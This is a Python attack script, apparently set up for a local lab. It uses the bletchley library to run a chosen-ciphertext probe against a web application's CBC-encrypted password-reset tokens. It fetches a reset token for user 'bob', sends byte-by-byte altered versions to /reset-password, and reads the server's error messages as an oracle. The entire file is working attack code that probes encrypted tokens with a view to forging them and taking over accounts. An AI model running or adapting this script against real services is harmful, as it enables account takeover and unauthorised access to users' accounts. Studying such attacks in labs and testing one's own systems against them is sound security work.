#!/usr/bin/env python3

import sys
from bletchley import blobtools,buffertools
from bletchley import chosenct
from bletchley.CBC import *

host = '127.0.0.1'
port = 8888
protocol = 'http'


def fetchFreshToken():
    gen_url = '%s://%s:%d/generate-reset-token?user=bob' % (protocol,host,port)
    response = requests.get(gen_url)
    return response.content.split(b'token=',1)[1].split(b'"')[0]


def decode(token):
    return blobtools.decodeChain(['percent/upper','base64/rfc3548'], token)


def encode(binary):
    return blobtools.encodeChain(['base64/rfc3548','percent/upper'], binary)


try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    sys.stderr.write('ERROR: Could not import requests module.  Ensure it is installed.\n')
    sys.stderr.write('       Under Debian, the package name is "python3-requests"\n.')
    sys.stderr.write('       Alternatively, re-generate this script using the --native option.\n.')
    sys.exit(1)


session = requests.Session()
def sendRequest(session, data=None):
    data = data.decode('utf-8')
    method = 'GET'
    path = '/reset-password?token='+data
    url = "%s://%s:%d%s" % (protocol,host,port,path)
    body = (b'')

    # Set verify=True if you want to validate the server cert
    return session.request(method, url, headers={}, data=body, allow_redirects=False, verify=False)
    

def processResponse(data, other=None):
    global session
    response = sendRequest(session, encode(data))

    if b'ERROR: <b>' in response.content:
        return response.content.split(b'ERROR: <b>')[1].split(b'</b>')[0]
    else:
        return 'success'


token = fetchFreshToken()
print('Fetched new password reset token for bob: ' + token.decode('utf-8'),file=sys.stderr)
ciphertext = decode(token)
#print(processResponse(ciphertext), file=sys.stderr)

# Byte-by-byte probing of ciphertext
result = chosenct.probe_bytes(processResponse, ciphertext, list(range(1,256)), max_threads=8)
print(result.toHTML())
